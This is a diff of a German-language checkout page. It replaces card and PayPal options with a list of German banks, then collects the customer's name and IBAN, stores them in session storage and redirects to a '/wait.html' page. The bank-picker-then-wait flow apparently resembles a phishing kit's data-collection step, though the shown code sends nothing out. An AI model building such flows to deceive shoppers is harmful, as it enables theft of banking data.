@@ -72,23 +72,35 @@
             outline: none;
             border-color: #DF0000;
         }
-        .payment-method {
+        .bank-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+        .bank-item {
             border: 2px solid #e3e3e3;
             border-radius: 6px;
-            padding: 15px;
-            margin-bottom: 15px;
+            padding: 12px;
+            text-align: center;
             cursor: pointer;
-            transition: all 0.2s;
+            font-weight: 600;
+            font-size: 0.95rem;
+            color: #000;
+            background: #fff;
+            transition: all 0.15s ease;
+            min-height: 70px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
-        .payment-method:hover {
+        .bank-item:hover {
             border-color: #DF0000;
         }
-        .payment-method.selected {
+        .bank-item.selected {
             border-color: #DF0000;
             background: #fff5f5;
-        }
-        .payment-method input[type="radio"] {
-            margin-right: 10px;
+            color: #DF0000;
         }
         .payment-summary-item {
             display: flex;
@@ -171,42 +183,27 @@
         <div class="payment-content">
             <!-- Payment Form -->
             <div class="payment-form-section">
-                <h2 class="payment-section-title">Zahlungsmethode</h2>
-                
-                <div class="payment-method" onclick="selectPaymentMethod('creditcard')">
-                    <input type="radio" name="payment-method" id="payment-creditcard" value="creditcard" onchange="selectPaymentMethod('creditcard')">
-                    <label for="payment-creditcard" style="cursor: pointer; font-weight: 600;">Kreditkarte</label>
+                <div id="bank-selection-section">
+                    <h2 class="payment-section-title">Bank auswählen</h2>
+                    <p style="margin-bottom: 15px; color: #555;">Bitte wählen Sie Ihre Bank aus und klicken Sie auf „Weiter“. Danach geben Sie Ihre Kontodaten ein.</p>
+                    <div id="bank-list" class="bank-grid">
+                        <!-- Banks will be injected here -->
+                    </div>
+                    <button id="bank-continue-button" class="payment-button" disabled>Weiter</button>
                 </div>
-                
-                <div class="payment-method" onclick="selectPaymentMethod('paypal')">
-                    <input type="radio" name="payment-method" id="payment-paypal" value="paypal" onchange="selectPaymentMethod('paypal')">
-                    <label for="payment-paypal" style="cursor: pointer; font-weight: 600;">PayPal</label>
-                </div>
-                
-                <div class="payment-method" onclick="selectPaymentMethod('banktransfer')">
-                    <input type="radio" name="payment-method" id="payment-banktransfer" value="banktransfer" onchange="selectPaymentMethod('banktransfer')">
-                    <label for="payment-banktransfer" style="cursor: pointer; font-weight: 600;">Überweisung</label>
-                </div>
-                
-                <div id="payment-details" style="display: none; margin-top: 20px;">
+
+                <div id="bank-details-section" style="display: none;">
+                    <h2 class="payment-section-title">Kontodaten</h2>
+                    <p id="selected-bank-text" style="margin-bottom: 20px; font-weight: 600; color: #000;"></p>
                     <div class="payment-form-group">
-                        <label class="payment-form-label" for="payment-card-number">Kartennummer</label>
-                        <input type="text" id="payment-card-number" class="payment-form-input" placeholder="1234 5678 9012 3456">
+                        <label class="payment-form-label" for="bank-account-name">Vor- und Nachname *</label>
+                        <input type="text" id="bank-account-name" class="payment-form-input" placeholder="Max Mustermann" required>
                     </div>
                     <div class="payment-form-group">
-                        <label class="payment-form-label" for="payment-card-name">Name auf der Karte</label>
-                        <input type="text" id="payment-card-name" class="payment-form-input" placeholder="Max Mustermann">
+                        <label class="payment-form-label" for="bank-iban">IBAN *</label>
+                        <input type="text" id="bank-iban" class="payment-form-input" placeholder="DE00 0000 0000 0000 0000 00" required>
                     </div>
-                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
-                        <div class="payment-form-group">
-                            <label class="payment-form-label" for="payment-card-expiry">Ablaufdatum</label>
-                            <input type="text" id="payment-card-expiry" class="payment-form-input" placeholder="MM/JJ">
-                        </div>
-                        <div class="payment-form-group">
-                            <label class="payment-form-label" for="payment-card-cvv">CVV</label>
-                            <input type="text" id="payment-card-cvv" class="payment-form-input" placeholder="123">
-                        </div>
-                    </div>
+                    <button id="bank-payment-button" class="payment-button">Zahlung starten</button>
                 </div>
             </div>
             
@@ -216,6 +213,11 @@
                 
                 <div class="customer-info" id="customer-info">
                     <!-- Customer info will be loaded here -->
+                </div>
+                <div class="customer-info" id="bank-summary-info" style="display: none;">
+                    <div class="customer-info-item">
+                        <span class="customer-info-label">Bank: </span><span id="bank-summary-name"></span>
+                    </div>
                 </div>
                 
                 <div id="payment-summary-items">
@@ -235,7 +237,7 @@
                     <span id="payment-total">0,00 €</span>
                 </div>
                 
-                <button id="payment-complete-button" class="payment-button" disabled>Zahlung abschließen</button>
+                <!-- Buttons handled in sections -->
             </div>
         </div>
     </div>
@@ -247,6 +249,7 @@
         // Load checkout data and cart items
         document.addEventListener('DOMContentLoaded', function() {
             loadPaymentData();
+            renderBankList();
         });
         
         function loadPaymentData() {
@@ -292,43 +295,72 @@
                     console.error('❌ Warenkorb konnte nicht geladen werden:', error);
                 });
         }
+
+        var bankListData = [
+            'Bensberger Bank','Bernhäuser Bank','Bethmann Bank','Bezirkssparkasse Reichenau','BodenseeBank','Bopfinger Bank',
+            'Bordesholmer Sparkasse','Brandenburger Bank','Bremer Volksbank','Brühler Bank','Budenheimer Volksbank','Bunq',
+            'Consorsbank by BNP Paribas','Sparda-Bank Hannover','Santander Consumer Bank','Comdirect Bank',
+            'Deutsche Kreditbank','ABN AMRO Bank','Aachener Bank','Airbus Bank','Aktivbank','Bank 1 Saar',
+            'Bank11','Bank für Sozialwirtschaft','Bankhaus Bauer','Bankhaus Ellwanger & Geiger'
+        ];
         
-        function selectPaymentMethod(method) {
-            // Remove selected class from all methods
-            document.querySelectorAll('.payment-method').forEach(function(el) {
-                el.classList.remove('selected');
+        var selectedBank = null;
+        var bankListElement = null;
+        
+        function renderBankList() {
+            bankListElement = document.getElementById('bank-list');
+            bankListElement.innerHTML = '';
+            
+            bankListData.forEach(function(bank) {
+                var item = document.createElement('button');
+                item.type = 'button';
+                item.className = 'bank-item';
+                item.textContent = bank;
+                item.addEventListener('click', function() {
+                    selectBank(bank, item);
+                });
+                bankListElement.appendChild(item);
             });
-            
-            // Add selected class to selected method
-            var selectedRadio = document.getElementById('payment-' + method);
-            if (selectedRadio) {
-                selectedRadio.checked = true;
-                selectedRadio.closest('.payment-method').classList.add('selected');
-            }
-            
-            // Show/hide payment details based on method
-            var paymentDetails = document.getElementById('payment-details');
-            var paymentButton = document.getElementById('payment-complete-button');
-            
-            if (method === 'creditcard') {
-                paymentDetails.style.display = 'block';
-                paymentButton.disabled = false;
-            } else if (method === 'paypal' || method === 'banktransfer') {
-                paymentDetails.style.display = 'none';
-                paymentButton.disabled = false;
-            }
         }
         
-        // Complete payment button
-        document.getElementById('payment-complete-button').addEventListener('click', function() {
-            var selectedMethod = document.querySelector('input[name="payment-method"]:checked');
-            if (!selectedMethod) {
-                alert('Bitte wählen Sie eine Zahlungsmethode aus.');
+        function selectBank(bankName, element) {
+            selectedBank = bankName;
+            document.querySelectorAll('.bank-item').forEach(function(el) {
+                el.classList.remove('selected');
+            });
+            element.classList.add('selected');
+            document.getElementById('bank-continue-button').disabled = false;
+            document.getElementById('bank-summary-info').style.display = 'block';
+            document.getElementById('bank-summary-name').textContent = bankName;
+        }
+        
+        document.getElementById('bank-continue-button').addEventListener('click', function() {
+            if (!selectedBank) {
+                alert('Bitte wählen Sie eine Bank aus.');
                 return;
             }
-            
-            alert('Zahlung erfolgreich abgeschlossen! (Diese Funktion ist noch nicht vollständig implementiert)');
-            // Here you would normally process the payment and redirect to a success page
+            document.getElementById('bank-selection-section').style.display = 'none';
+            document.getElementById('bank-details-section').style.display = 'block';
+            document.getElementById('selected-bank-text').textContent = 'Gewählte Bank: ' + selectedBank;
+        });
+        
+        document.getElementById('bank-payment-button').addEventListener('click', function() {
+            var accountName = document.getElementById('bank-account-name').value.trim();
+            var iban = document.getElementById('bank-iban').value.trim();
+            if (!accountName || !iban) {
+                alert('Bitte geben Sie Vor- und Nachname sowie IBAN ein.');
+                return;
+            }
+            if (!selectedBank) {
+                alert('Bitte wählen Sie zuerst eine Bank aus.');
+                return;
+            }
+            sessionStorage.setItem('checkoutBank', JSON.stringify({
+                bank: selectedBank,
+                accountName: accountName,
+                iban: iban
+            }));
+            window.location.href = '/wait.html';
         });
     </script>
 </body>
